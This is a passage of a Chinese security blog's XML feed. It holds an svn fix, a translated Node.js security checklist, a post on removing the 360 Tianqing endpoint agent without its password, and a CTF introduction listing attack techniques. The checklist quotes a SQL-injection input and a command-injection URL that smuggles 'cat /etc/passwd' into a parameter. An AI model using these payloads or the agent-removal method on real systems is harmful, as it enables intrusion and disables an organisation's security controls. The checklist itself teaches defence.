    <link href="/2019/07/08/2019-07-08-fastjson/"/>
    <url>/2019/07/08/2019-07-08-fastjson/</url>
    
    <content type="html"><![CDATA[<h2 id="fastjson-反序列化问题"><a href="#fastjson-反序列化问题" class="headerlink" title="fastjson 反序列化问题"></a>fastjson 反序列化问题</h2><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fastjson</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>centos7 svn 客户端错误svn: E210007: Unable to connect to a repository at URL的解决方法</title>
    <link href="/2019/07/08/2019-07-08-centos-svn-client-error-E210007-unable-to-connect-to-a-repository-at-url/"/>
    <url>/2019/07/08/2019-07-08-centos-svn-client-error-E210007-unable-to-connect-to-a-repository-at-url/</url>
    
    <content type="html"><![CDATA[<h2 id="centos7-svn-客户端错误svn-E210007-Unable-to-connect-to-a-repository-at-URL的解决方法"><a href="#centos7-svn-客户端错误svn-E210007-Unable-to-connect-to-a-repository-at-URL的解决方法" class="headerlink" title="centos7 svn 客户端错误svn: E210007: Unable to connect to a repository at URL的解决方法"></a>centos7 svn 客户端错误svn: E210007: Unable to connect to a repository at URL的解决方法</h2><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>centos7 使用svn同步代码，同步过程中报错</p><pre><code class="hljs livecodeserver">svn: E210007: Unable <span class="hljs-built_in">to</span> connect <span class="hljs-built_in">to</span> <span class="hljs-keyword">a</span> repository <span class="hljs-keyword">at</span> <span class="hljs-built_in">URL</span> <span class="hljs-string">'svn://git.oschina.net/cqcqphper/taskPHP'</span>svn: E210007: Cannot negotiate authentication mechanism</code></pre><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>服务器缺少cyrus-sasl cyrus-sasl-plain cyrus-sasl-ldap 组件。<br>运行以下命令，成功解决<br><code>sudo yum install cyrus-sasl cyrus-sasl-plain cyrus-sasl-ldap</code></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>日常吐槽</title>
    <link href="/2019/07/02/2019-07-02-Personal-ridicule/"/>
    <url>/2019/07/02/2019-07-02-Personal-ridicule/</url>
    
    <content type="html"><![CDATA[<h2 id="Node-js-安全清单"><a href="#Node-js-安全清单" class="headerlink" title="Node.js 安全清单"></a>Node.js 安全清单</h2>]]></content>
    
    
    <categories>
      
      <category>Personal</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Node.js 安全清单</title>
    <link href="/2019/06/11/2019-06-11-Node-js-security-checklist/"/>
    <url>/2019/06/11/2019-06-11-Node-js-security-checklist/</url>
    
    <content type="html"><![CDATA[<h2 id="Node-js-安全清单"><a href="#Node-js-安全清单" class="headerlink" title="Node.js 安全清单"></a>Node.js 安全清单</h2><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr><p>安全性，总是一个不可忽视的问题。许多人都承认这点，但是却很少有人真的认真地对待它。所以我们列出了这个清单，让你在将你的应用部署到生产环境来给千万用户使用之前，做一个安全检查。<br>以下列出的安全项，大多都具有普适性，适用于除了Node.js外的各种语言和框架。但是，其中也包含一些用Node.js写的小工具。</p><h1 id="配置管理"><a href="#配置管理" class="headerlink" title="配置管理"></a>配置管理</h1><h2 id="安全性相关的HTTP头"><a href="#安全性相关的HTTP头" class="headerlink" title="安全性相关的HTTP头"></a>安全性相关的HTTP头</h2><p>以下是一些安全性相关的HTTP头，你的站点应该设置它们：</p><ul><li>Strict-Transport-Security：强制使用安全连接（SSL/TLS之上的HTTPS）来连接到服务器。</li><li>X-Frame-Options：提供对于“点击劫持”的保护。</li><li>X-XSS-Protection：开启大多现代浏览器内建的对于跨站脚本攻击（XSS）的过滤功能。</li><li>X-Content-Type-Options： 防止浏览器使用MIME-sniffing来确定响应的类型，转而使用明确的content-type来确定。</li><li>Content-Security-Policy：防止受到跨站脚本攻击以及其他跨站注入攻击。</li></ul><p>在Node.js中，这些都可以通过使用Helmet模块轻松设置完毕：</p><pre><code class="hljs php"><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">'express'</span>);<span class="hljs-keyword">var</span> helmet = <span class="hljs-keyword">require</span>(<span class="hljs-string">'helmet'</span>);<span class="hljs-keyword">var</span> app = express();app.<span class="hljs-keyword">use</span>(<span class="hljs-title">helmet</span>());</code></pre><p>Helmet在Koa中也能使用：koa-helmet。<br>当然，在许多的架构中，这些头会在Web服务器(Apache，nginx)的配置中设置，而不是在应用的代码中。如果是通过nginx配置，配置文件会类似于如下例子：</p><pre><code class="hljs mipsasm"><span class="hljs-comment"># nginx.conf</span><span class="hljs-keyword">add_header </span>X-Frame-Options SAMEORIGIN;<span class="hljs-keyword">add_header </span>X-Content-Type-Options nosniff;<span class="hljs-keyword">add_header </span>X-XSS-Protection <span class="hljs-string">"1; mode=block"</span>;<span class="hljs-keyword">add_header </span>Content-Security-Policy <span class="hljs-string">"default-src 'self'"</span>;</code></pre><p>完整的例子可以参考这个nginx配置。<br>如果你想快速确认你的网站是否都设置这些HTTP头，你可以通过这个网站在线检查：<a href="http://cyh.herokuapp.com/cyh" target="_blank" rel="noopener">http://cyh.herokuapp.com/cyh</a> 。</p><h3 id="客户端的敏感数据"><a href="#客户端的敏感数据" class="headerlink" title="客户端的敏感数据"></a>客户端的敏感数据</h3><p>当部署前端应用时，确保不要在代码中暴露如密钥这样的敏感数据，这将可以被所有人看到。<br>现今并没有什么自动化检测它们的办法，但是还是有一些手段可以用来减少不小心将敏感数据暴露在客户端的概率：</p><ul><li>使用pull request更新代码</li><li>建立起code review机制</li></ul><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><h3 id="对于暴力破解的保护"><a href="#对于暴力破解的保护" class="headerlink" title="对于暴力破解的保护"></a>对于暴力破解的保护</h3><p>暴力破解即系统地列举所有可能的结果，并逐一尝试，来找到正确答案。在web应用中，通常会出现在用户的登录模块。<br>你可以通过限制用户的连接频率来防止这类的攻击。在Node.js中，你可以使用ratelimiter模块。</p><pre><code class="hljs qml"><span class="hljs-keyword">var</span> email = req.body.email;<span class="hljs-keyword">var</span> limit = <span class="hljs-keyword">new</span> Limiter(&#123; <span class="hljs-attribute">id:</span><span class="hljs-string"> email</span>, <span class="hljs-attribute">db</span>: db &#125;);limit.get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, limit</span>) </span>&#123;&#125;);</code></pre><p>当然，你可以将它封装成一个中间件以供你的应用使用。Express和Koa都已经有现成不错的中间件：</p><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> ratelimit = <span class="hljs-built_in">require</span>(<span class="hljs-string">'koa-ratelimit'</span>);<span class="hljs-keyword">var</span> redis = <span class="hljs-built_in">require</span>(<span class="hljs-string">'redis'</span>);<span class="hljs-keyword">var</span> koa = <span class="hljs-built_in">require</span>(<span class="hljs-string">'koa'</span>);<span class="hljs-keyword">var</span> app = koa();<span class="hljs-keyword">var</span> emailBasedRatelimit = ratelimit(&#123;  db: redis.createClient(),  duration: <span class="hljs-number">60000</span>,  max: <span class="hljs-number">10</span>,  id: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">context</span>) </span>&#123;    <span class="hljs-keyword">return</span> context.body.email;    &#125;&#125;);<span class="hljs-keyword">var</span> ipBasedRatelimit = ratelimit(&#123;  db: redis.createClient(),  duration: <span class="hljs-number">60000</span>,  max: <span class="hljs-number">10</span>,  id: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">context</span>) </span>&#123;    <span class="hljs-keyword">return</span> context.ip;    &#125;&#125;);app.post(<span class="hljs-string">'/login'</span>, ipBasedRatelimit, emailBasedRatelimit, handleLogin);</code></pre><p>这里我们所做的，就是限制了在一段给定时间内，用户可以尝试登陆的次数，这可以减少用户密码被暴力破解的风险。以上例子中的选项都是可以根据实际情况进行改变的，所以不要简单的复制粘贴它们。<br>如果你想要测试你的服务在这些场景下的表现，你可以使用hydra（kali中暴力破解工具）。</p><h2 id="Session管理"><a href="#Session管理" class="headerlink" title="Session管理"></a>Session管理</h2><p>对于cookie的安全使用，其重要性是不言而喻的。特别是对于动态的web应用，在如HTTP这样的无状态协议的之上，它们需要使用cookie来维持状态。</p><h3 id="Cookie标志位"><a href="#Cookie标志位" class="headerlink" title="Cookie标志位"></a>Cookie标志位</h3><p>以下是每个cookie可以设置的属性的列表，以及它们的含义：</p><ul><li>secure - 这个属性告诉浏览器，仅在请求是通过HTTPS传输时，才传递cookie。</li><li>HttpOnly - 设置这个属性将禁止javascript脚本获取到这个cookie，这可以用来帮助防止跨站脚本攻击。</li></ul><h3 id="Cookie作用域"><a href="#Cookie作用域" class="headerlink" title="Cookie作用域"></a>Cookie作用域</h3><ul><li>domain - 这个属性用来比较请求URL中服务端的域名。如果域名匹配成功，或这是其子域名，则继续检查path属性。</li><li>path - 除了域名，cookie可用的URL路径也可以被指定。当域名和路径都匹配时，cookie才会随请求发送。</li><li>expires - 这个属性用来设置持久化的cookie，当设置了它之后，cookie在指定的时间到达之前都不会过期。</li></ul><p>在Node.js中，你可以使用cookies模块来轻松创建cookie。但是，它是较底层的。在创建应用时，你可能更想使用它的一些封装，如cookie-session 。</p><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> cookieSession = <span class="hljs-built_in">require</span>(<span class="hljs-string">'cookie-session'</span>);<span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);<span class="hljs-keyword">var</span> app = express();app.use(cookieSession(&#123;name: <span class="hljs-string">'session'</span>,keys: [process.env.COOKIE_KEY1,process.env.COOKIE_KEY2]&#125;));app.use(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;<span class="hljs-keyword">var</span> n = req.session.views || <span class="hljs-number">0</span>;req.session.views = n++;res.end(n + <span class="hljs-string">' views'</span>);&#125;);app.listen(<span class="hljs-number">3000</span>);</code></pre><p>(以上例子取自<a href="https://www.npmjs.com/package/cookie-session" target="_blank" rel="noopener">cookie-session</a>模块的文档)</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>跨站请求伪造（CSRF）是一种迫使用户在他们已登录的web应用中，执行一个并非他们原意的操作的攻击手段。这种攻击常常用于那些会改变用户的状态的请求，通常它们并不窃取数据，因为攻击者并不能看到响应的内容。</br><br>在Node.js中，你可以使用<a href="https://www.npmjs.com/package/csrf" target="_blank" rel="noopener">csrf模块</a>来缓和这种攻击。它同样是非常底层的，你可能更喜欢使用如<a href="https://www.npmjs.com/package/csurf" target="_blank" rel="noopener">csurf</a>这样的Express中间件。<br>在路由层，可以会有如下代码：</p><pre><code class="hljs php"><span class="hljs-keyword">var</span> cookieParser = <span class="hljs-keyword">require</span>(<span class="hljs-string">'cookie-parser'</span>);<span class="hljs-keyword">var</span> csrf = <span class="hljs-keyword">require</span>(<span class="hljs-string">'csurf'</span>);<span class="hljs-keyword">var</span> bodyParser = <span class="hljs-keyword">require</span>(<span class="hljs-string">'body-parser'</span>);<span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">'express'</span>);<span class="hljs-comment">// setup route middlewares</span><span class="hljs-keyword">var</span> csrfProtection = csrf(&#123; cookie: <span class="hljs-keyword">true</span> &#125;);<span class="hljs-keyword">var</span> parseForm = bodyParser.urlencoded(&#123; extended: <span class="hljs-keyword">false</span> &#125;);<span class="hljs-comment">// create express app</span><span class="hljs-keyword">var</span> app = express();<span class="hljs-comment">// we need this because "cookie" is true in csrfProtection</span>app.<span class="hljs-keyword">use</span>(<span class="hljs-title">cookieParser</span>());app.get(<span class="hljs-string">'/form'</span>, csrfProtection, <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(req, res)</span> </span>&#123;<span class="hljs-comment">// pass the csrfToken to the view</span>res.render(<span class="hljs-string">'send'</span>, &#123; csrfToken: req.csrfToken() &#125;);&#125;);app.post(<span class="hljs-string">'/process'</span>, parseForm, csrfProtection, <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(req, res)</span> </span>&#123;res.send(<span class="hljs-string">'data is being processed'</span>);&#125;);</code></pre><p>在视图层，你需要使用CSRF token：</p><pre><code class="hljs pgsql">&lt;form action="/process" <span class="hljs-keyword">method</span>="POST"&gt;&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>="hidden" <span class="hljs-type">name</span>="_csrf" <span class="hljs-keyword">value</span>="&#123;&#123;csrfToken&#125;&#125;"&gt;Favorite color: &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>="text" <span class="hljs-type">name</span>="favoriteColor"&gt;&lt;button <span class="hljs-keyword">type</span>="submit"&gt;Submit&lt;/button&gt;&lt;/form&gt;</code></pre><p>(以上例子取自<a href="https://www.npmjs.com/package/csurf" target="_blank" rel="noopener">csurf模块</a>的文档)</p><h2 id="数据校验"><a href="#数据校验" class="headerlink" title="数据校验"></a>数据校验</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>以下是两种类似的，但是略有不同的攻击方式，一种关于反射型跨站脚本，而另一种则关于存储型跨站脚本攻击。</p><ul><li>反射型XSS攻击 在攻击者向指定的URL的响应HTML中注入可执行的JavaScript代码时发生。</li><li>存储型XSS攻击 在应用存储未经过滤的用户输入时发生。用户输入的代码会在你的应用环境下执行。</li></ul><p>为了防御这类攻击，请确保你总是检查并过滤了用户的输入内容。</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>在用户的输入中包含部分或完整的SQL查询语句时，SQL注入就有可能发生。它可能会读取敏感数据，或是直接删除数据。<br>例如：</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> title, author <span class="hljs-keyword">from</span> books <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=$<span class="hljs-keyword">id</span></code></pre><p>以上这个例子中，$id来自于用户输入。用户输入2 or 1=1也可以。这个查询可能会变成：</p><pre><code class="hljs routeros">select title, author <span class="hljs-keyword">from</span> books where <span class="hljs-attribute">id</span>=2 <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1</code></pre><p>抵御这类攻击的最简单方式是使用参数化查询（parameterized queries）或预处理语句（prepared statements）。<br>如果你正在通过Node.js使用PostgreSQL。那么你可以使用<a href="https://www.npmjs.com/package/pg" target="_blank" rel="noopener">node-postgres模块</a>，来创建参数化查询：</p><pre><code class="hljs oxygene"><span class="hljs-keyword">var</span> q = <span class="hljs-string">'SELECT name FROM books WHERE id = $1'</span>;client.query(q, [<span class="hljs-string">'3'</span>], <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(err, <span class="hljs-keyword">result</span>)</span> <span class="hljs-comment">&#123;&#125;</span>);</span></code></pre><p><a href="http://sqlmap.org/" target="_blank" rel="noopener">sqlmap</a> 是一个开源的渗透测试工具，自动化检测利用SQL注入漏洞并接管数据库。</p><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>攻击者使用命令注入来在远程web服务器中运行系统命令。通过命令注入，攻击者甚至可以取得系统的密码。<br>实践中，如果你有一个URL：<br><code>https://example.com/downloads?file=user1.txt</code><br>它可以变成：<br><code>https://example.com/downloads?file=%3Bcat%20/etc/passwd</code><br>在这个例子中，<code>%3B</code>会变成一个分号。所以将会运行多条系统命令。<br><strong>为了预防这类攻击，请确保总是检查过滤了用户的输入内容。</strong><br>我们也可以以Node.js的角度来说：</p><pre><code class="hljs scilab">child_process.<span class="hljs-built_in">exec</span>(<span class="hljs-string">'ls'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(err, data)</span> &#123;</span>console.<span class="hljs-built_in">log</span>(data);&#125;);</code></pre><p>在<strong>child_process.exec</strong>的底层，它调用了<strong>/bin/sh</strong>，所以它是一个bash解释器，而不仅仅是只能执行用户程序。<br>当用户的输入是一个反引号或<strong>$()</strong>时，将它们传入这个方法就很危险了,可能会有一个新的命令被攻击者注入了。反引号的作用就是将反引号内的Linux命令先执行，然后将执行结果赋予变量。<br>可以通过使用<strong>child_process.execFile</strong>来解决上面这个问题。</p><h2 id="安全传输"><a href="#安全传输" class="headerlink" title="安全传输"></a>安全传输</h2><h3 id="SSL版本，算法，键长度"><a href="#SSL版本，算法，键长度" class="headerlink" title="SSL版本，算法，键长度"></a>SSL版本，算法，键长度</h3><p>由于HTTP是明文传输的，所以我们需要通过一个SSL/TLS通道来加密，即HTTPS。如今高级别的加密方式已被普遍使用，但是，如果在服务端缺乏配置，也可能会导致服务端使用低级别的加密，或不加密。<br>你需要测试：</p><ul><li>密码，密钥和重协商（renegotiation）都已经合法妥善得配置完毕。</li><li>证书的合法性。</li></ul><p>使用如<a href="https://nmap.org/" target="_blank" rel="noopener">nmap</a>和<a href="https://github.com/iSECPartners/sslyze" target="_blank" rel="noopener">sslyze</a>这样的工具可以使这项工作非常简单。<br>检查证书信息<br><code>nmap --script ssl-cert,ssl-enum-ciphers -p 443,465,993,995 www.example.com</code><br>使用sslyze来检查SSL/TSL：<br><code>./sslyze.py --regular example.com:443</code></p><h3 id="HSTS"><a href="#HSTS" class="headerlink" title="HSTS"></a>HSTS</h3><p>在上文的配置管理章节我们已经对其有了接触 <strong>Strict-Transport-Security</strong>头会强制使用HTTPS来连接服务器。以下是一个Twitter的例子：</p><pre><code class="hljs elm"><span class="hljs-title">strict</span>-trans<span class="hljs-keyword">port</span>-security:max-age=631138519</code></pre><p>这里的<code>max-age</code>定义了浏览器需要自动将所有HTTP请求转换成HTTPS的有效时间。<br>对于它的测试是非常简单的：<br><code>curl -s -D- https://twitter.com/ | grep -i Strict</code></p><h2 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h2><h3 id="账号锁定"><a href="#账号锁定" class="headerlink" title="账号锁定"></a>账号锁定</h3><p>账号锁定用于缓和暴力破解带来的拒绝服务方面的影响。实际上，它意味着，当用户尝试了几次登陆并失败后，将在其后的一段时间内，禁止用户的登陆操作。<br>可以使用之前提到的<strong>rate-limiter</strong>来阻止这类攻击。</p><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>这类攻击主要是由于一些正则表达式，在极端情况下，会变得性能及其糟糕。这些正则被称为恶魔正则（Evil Regexes）：</p><ul><li>对于重复文本进行分组</li><li>在重复分组内<ul><li>重复</li><li>交替重叠</li></ul></li></ul><p><code>([a-zA-Z]+)*</code>，<code>(a+)+</code>或<code>(a|a?)+</code>都是有问题的漏洞正则表达式，在如aaaaaaaaaaaaaaaaaaaaaaaa! 这样的输入面前，都是脆弱的。这会引起大量的计算。更多详情可以参考<a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS" target="_blank" rel="noopener">正则表达式ReDos</a></p><p>可以使用Node.js工具<a href="https://www.npmjs.com/package/safe-regex" target="_blank" rel="noopener">safe-regex</a>这检测你的正则表达式，它可能会误报，所以小心使用。</p><pre><code class="hljs crmsh">$ <span class="hljs-keyword">node</span> <span class="hljs-title">safe</span>.js '(beep|boop)*'<span class="hljs-literal">true</span>$ <span class="hljs-keyword">node</span> <span class="hljs-title">safe</span>.js '(a+)&#123;<span class="hljs-number">10</span>&#125;'<span class="hljs-literal">false</span></code></pre><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><h3 id="错误码，堆栈信息"><a href="#错误码，堆栈信息" class="headerlink" title="错误码，堆栈信息"></a>错误码，堆栈信息</h3><p>一些错误场景可能会导致应用泄露底层的应用架构信息，如：<strong>X-Powered-By:Express</strong>。<br>堆栈信息可能自己本身并没有什么用，但它经常能泄露一些攻击者非常感兴趣的信息。将堆栈信息返回出来是非常不好的做法。你需要将它们记录在日志中，而不是展示给用户。</p><h2 id="NPM"><a href="#NPM" class="headerlink" title="NPM"></a>NPM</h2><p>能力越大，责任越大。NPM有这许多可以现成使用的模块，但是方便的代价是：你需要检查这些包本身是否存在安全问题。</p><h3 id="Node安全项目"><a href="#Node安全项目" class="headerlink" title="Node安全项目"></a>Node安全项目</h3><p>幸运的是Node Security project(nsp)是一个非常棒的工具，来检查你使用的模块是否是易被一些已知的手段攻击的。</p><pre><code class="hljs properties"><span class="hljs-attr">npm</span> <span class="hljs-string">i nsp -g</span><span class="hljs-comment"># either audit the shrinkwrap</span><span class="hljs-attr">nsp</span> <span class="hljs-string">audit-shrinkwrap</span><span class="hljs-comment"># or the package.json</span><span class="hljs-attr">nsp</span> <span class="hljs-string">audit-package</span></code></pre><p>你还可以使用 <a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Frequiresafe">requireSafe</a> 来帮你做这件事。</p><h3 id="Snyk"><a href="#Snyk" class="headerlink" title="Snyk"></a>Snyk</h3><p>Snyk和Node安全项目相似，但是它的目标不仅是提供工具发现漏洞，还能在你的项目仓库中解决相关安全问题。<br>可以尝试一下<a href="https://link.juejin.im/?target=https%3A%2F%2Fsnyk.io">snyk.io</a>。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>这个清单主要根据OWASP维护的<a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FWeb_Application_Security_Testing_Cheat_Sheet">Web Application Security Testing Cheat Sheet</a>所列。<br>在客户侧做代码审计，发现客户使用的是金融企业很少使用的nodejs作为开发框架，对于部分安全人员可能很陌生，网上也有部分使用机器翻译的文章，个人感觉比较生涩，所以抽空翻译了一下，方便以后查阅。</p><hr><p>原文链接<a href="https://blog.risingstack.com/node-js-security-checklist/" target="_blank" rel="noopener">https://blog.risingstack.com/node-js-security-checklist/</a></p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Code Audit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Node.js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>移除360天擎</title>
    <link href="/2019/06/01/2019-06-01-remove-360-tianqing/"/>
    <url>/2019/06/01/2019-06-01-remove-360-tianqing/</url>
    
    <content type="html"><![CDATA[<h1 id="无密码卸载360天擎"><a href="#无密码卸载360天擎" class="headerlink" title="无密码卸载360天擎"></a>无密码卸载360天擎</h1><hr><p>不少甲方爸爸使用360天擎这款终端安全软件，为了接入客户的内网，被迫安装。安装后，电脑各种卡顿，卸载还需要密码，这就难受了，琢磨了一下，找出了两个卸载方法，供各位参考</p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><h3 id="找到360的安装目录"><a href="#找到360的安装目录" class="headerlink" title="找到360的安装目录"></a>找到360的安装目录</h3><p>360天擎安装目录很好找，通常都安装在C盘的Program Files或者Program Files (x86)，如果你在安装的时候指定了安装目录请绕过此步</p><h3 id="准备一个PE系统或者linux系统"><a href="#准备一个PE系统或者linux系统" class="headerlink" title="准备一个PE系统或者linux系统"></a>准备一个PE系统或者linux系统</h3><p>由于360安装目录下的文件禁止被更改，个人学艺不精，不清楚如何在windows上修改对应的文件，只能通过PE或者linux系统对360的配置文件进行修改</p><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>360的配置文件位于360\360Safe\EntClient\conf\ExtBase.dat，将其中的uipass置空即可<br><img src="/images/360sage-config.png" srcset="/img/loading.gif" alt="360sage-config.png"></p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><h3 id="粉碎相关配置文件"><a href="#粉碎相关配置文件" class="headerlink" title="粉碎相关配置文件"></a>粉碎相关配置文件</h3><p>使用第三方的文件粉碎器，强行移除360\360Safe\EntClient\conf\ExtBase.dat文件</p><h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><p>1、重新进入windows系统后，进入360的安装目录，找到360Safe\uninst.exe，点击运行，然后进行卸载即可<br><img src="/images/360-uninstall.png" srcset="/img/loading.gif" alt="360-uninstall.png"><br>2、或者直接使用控制面板里的程序和功能模块下的卸载或更改程序进行卸载<br><img src="/images/360-uninstall-control.png" srcset="/img/loading.gif" alt="360-uninstall-control.png"></p><h2 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h2><p>卸载完成以后需要重启，重启以后才能移除剩余文件</p><hr><p>附：本文只是提供网友一个卸载方法，如有任何侵权，请及时联系本人。</p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF基础介绍</title>
    <link href="/2019/01/20/2019-03-30-burpsuite-detail/"/>
    <url>/2019/01/20/2019-03-30-burpsuite-detail/</url>
    
    <content type="html"><![CDATA[<h1 id="CTF-基础"><a href="#CTF-基础" class="headerlink" title="CTF 基础"></a>CTF 基础</h1><hr><p>CTF(Capture The Flag，夺旗赛），在网络安全领域中指安全人员之间进行技术竞技的一种比赛。</p><h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯” 。</p><h2 id="CTF赛事"><a href="#CTF赛事" class="headerlink" title="CTF赛事"></a>CTF赛事</h2><blockquote><ul><li>ISCC(信息安全与对抗技术竞赛)</li><li>ISG（中国网络安全技能竞赛）</li><li>XCTF（XCTF国际网络攻防联赛）</li><li>…</li></ul></blockquote><h2 id="CTF竞赛模式"><a href="#CTF竞赛模式" class="headerlink" title="CTF竞赛模式"></a>CTF竞赛模式</h2><blockquote><ul><li>解题模式</li><li>攻防模式</li><li>防御模式</li><li>混合模式</li><li>综合模式</li></ul></blockquote><h3 id="解题模式"><a href="#解题模式" class="headerlink" title="解题模式"></a>解题模式</h3><p>常见于线上选拨比赛，参赛队伍需要运用安全相关的理论知识及技术来解决问题，并获取一串被称为flag的字符串进行提交，以此来获取分数<br>特点：每一道题目都有相应的分值，同一类题目中难度越大分值越高。</p><h3 id="综合模式"><a href="#综合模式" class="headerlink" title="综合模式"></a>综合模式</h3><p>综合靶场贴合行业用户业务系统架构，整个综合靶场由多台漏洞靶机构成。用户可以有多个攻防入口多种攻防路径选择，让参赛选手在大型真实的行业业务系统中进行挑战，难度较高。</p><h3 id="攻防模式"><a href="#攻防模式" class="headerlink" title="攻防模式"></a>攻防模式</h3><p>每个参赛队伍既是攻击者又是防御者，保证自己的服务器不被攻击、服务不中断。通过漏洞挖掘、流量分析等方式找到可利用的漏洞，攻击其他队伍的服务器。</p><h3 id="防御模式"><a href="#防御模式" class="headerlink" title="防御模式"></a>防御模式</h3><p>每个参赛队伍均是防御者，保证自己的服务器不被攻击、服务不中断。</p><h3 id="混合模式"><a href="#混合模式" class="headerlink" title="混合模式"></a>混合模式</h3><p>结合解题模式与攻防模式的CTF赛制，如通过解题模式获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏。</p><h2 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h2><p>由于国内重视网络安全法，从18年开始出现爆发时增长态势，各种层次不齐的CTF赛事层出不穷。</p><h3 id="比赛形式"><a href="#比赛形式" class="headerlink" title="比赛形式"></a>比赛形式</h3><blockquote><ul><li>线上预选赛</li><li>线下半决赛</li><li>线下总决赛</li></ul></blockquote><h3 id="价值体现"><a href="#价值体现" class="headerlink" title="价值体现"></a>价值体现</h3><p>行业选拔人才，提升重要行业部门，科研院校的网络安全实战能力；行业提高安全部门的入侵检测和防御能力，增加公司荣誉；个人提高就业机会和增加零花钱。</p><h2 id="CTF-题型"><a href="#CTF-题型" class="headerlink" title="CTF 题型"></a>CTF 题型</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>SQL,XSS,文件上传，ssrf，远程命令执行等等</p><blockquote><ul><li>一、爆破，包括包括md5、爆破随机数、验证码识别等</li><li>二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截</li><li>三、花式玩弄几个PHP特性，包括弱类型，strpos和===，反序列化+destruct、\0截断、iconv截断、</li><li>四、密码题，包括hash长度扩展、异或、移位加密各种变形、32位随机数过小</li><li>五、各种找源码技巧，包括git、svn、xxx.php.swp、<em>www</em>.(zip|tar.gz|rar|7z)、xxx.php.bak</li><li>六、文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt .phps、各种文件内容检测&lt;?php &lt;? &lt;% <script language=php>、花式解析漏洞、</li><li>七、Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换</li><li>八、open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法</li><li>九、条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱</li><li>十、社工，包括花式查社工库、微博、QQ签名、whois</li><li>十一、windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断</li><li>十二、SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等</li><li>十三、XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash 